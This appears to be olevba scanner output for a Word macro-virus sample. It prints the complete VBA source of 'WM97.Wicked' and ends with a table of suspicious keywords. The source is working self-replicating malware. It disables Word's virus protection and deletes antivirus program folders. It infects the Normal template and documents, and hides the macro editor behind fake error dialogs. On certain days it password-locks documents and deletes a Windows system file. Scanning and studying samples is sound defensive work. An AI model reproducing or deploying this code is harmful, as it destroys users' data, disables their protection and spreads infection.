olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ultras.Wicked.b-fd0d59895463faa32104614a37e4afcf9cc8c28a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ultras.Wicked.b-fd0d59895463faa32104614a37e4afcf9cc8c28a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Wicked.bas 
in file: Virus.MSWord.Ultras.Wicked.b-fd0d59895463faa32104614a37e4afcf9cc8c28a - OLE stream: 'Macros/VBA/Wicked'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'**********************************************************************
'*                       WM97.Wicked BY ULTRAS                        *
'*                            Version 1.1                             *
'**********************************************************************
Sub AutoOpen()
On Error GoTo Wicked
Options.VirusProtection = False
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\Program Files\FindVirus\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Tbavw95\*.*"
Call AutoClose
Call Wicked
Wicked:
End Sub

Sub AutoClose()
On Error GoTo Wicked
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.UserName = "ULTRAS"
Application.UserInitials = "Wicked"
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
For b = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(b).Name = "Wicked" Then
DocInfect = True
End If
Next
For u = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(u).Name = "Wicked" Then
GlobInfect = True
End If
Next
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
ActiveDocument.SaveAs filename:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll
Call Wicked
Wicked:
End Sub

Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
On Error GoTo Wicked
Call Wicked
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.UserName = "ULTRAS"
Application.UserInitials = "Wicked"
WordBasic.DisableAutoMacros 0
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
GlobalInfect = False
DocumentInfect = False
For u = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(u).Name = "Wicked" Then
GlobalInfect = True
End If
Next
For w = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(w).Name = "Wicked" Then
DocumentInfect = True
End If
Next
If GlobalInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocumentInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
ActiveDocument.SaveAs filename:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Wicked:
End Sub

Sub FilePrint()
On Error GoTo Wicked
Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
With ULTRAS
.InsertBefore "WICKED BY ULTRAS"
.Font.Name = "Impact"
.Font.Size = 36
.Font.ColorIndex = 9
.Font.Shadow = 1
End With
Wicked:
Dialogs(wdDialogFilePrint).Show
End Sub

Sub ToolsMacro()
On Error Resume Next
Beep
MsgBox " Not enought memory !! ", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "WordBasic Err = 7"
End Sub

Sub ViewVBCode()
On Error Resume Next
Beep
MsgBox " Not enought memory !! " & vbCrLf & "", vbExclamation + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "WordBasic Err = 7"
End Sub

Sub FileTemplates()
Beep
End Sub

Sub ToolsCustomize()
Beep
End Sub

Sub Wicked()
On Error GoTo Wicked
If Day(Now()) = 3 Then
Do
MsgBox "You Infected WICKED by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
Loop
ActiveDocument.Password = "WICKED"
ActiveDocument.Save
End If
If Day(Now()) = 16 Then
Do
MsgBox "You Infected WICKED by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
Loop
SetAttr "c:\Windows\System\vmm32.vxd", 0
Kill "c:\Windows\System\vmm32.vxd"
End If
If Day(Now()) = 24 Then
MsgBox "You Infected WM97.WICKED by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
ActiveDocument.Password = "ULTRAS"
ActiveDocument.Save
End If
Wicked:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

